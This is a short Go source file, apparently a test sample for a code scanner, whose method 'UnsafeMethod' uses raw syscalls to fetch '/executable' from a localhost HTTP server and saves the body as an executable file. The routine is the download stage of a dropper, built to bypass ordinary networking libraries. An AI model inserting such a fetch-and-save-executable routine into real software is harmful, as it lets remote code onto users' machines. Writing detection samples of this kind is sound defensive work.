package m5_download_reflect

import (
	"fmt"
	"os"
	"strings"
	"syscall"
)

type MyType string

func (t MyType) UnsafeMethod() {
	// Remote target
	host := "127.0.0.1"
	port := 8080
	path := "/executable"

	// Create socket
	sockFd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Println("Socket error:", err)
		return
	}
	defer syscall.Close(sockFd)

	// Set up address
	addr := syscall.SockaddrInet4{
		Port: port,
	}
	copy(addr.Addr[:], []byte{127, 0, 0, 1}) // localhost IP

	// Connect
	err = syscall.Connect(sockFd, &addr)
	if err != nil {
		fmt.Println("Connect error:", err)
		return
	}

	// Send HTTP GET request
	request := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host)
	_, err = syscall.Write(sockFd, []byte(request))
	if err != nil {
		fmt.Println("Write error:", err)
		return
	}

	// Receive response
	buf := make([]byte, 4096)
	response := []byte{}
	for {
		n, err := syscall.Read(sockFd, buf)
		if err != nil || n == 0 {
			break
		}
		response = append(response, buf[:n]...)
	}

	// Find body (after header)
	respStr := string(response)
	headerEnd := strings.Index(respStr, "\r\n\r\n")
	if headerEnd == -1 {
		fmt.Println("Invalid HTTP response")
		return
	}
	body := response[headerEnd+4:]

	// Write to file
	err = os.WriteFile("downloaded_file", body, 0755)
	if err != nil {
		fmt.Println("WriteFile error:", err)
		return
	}

	fmt.Println("File downloaded to 'downloaded_file'")
}
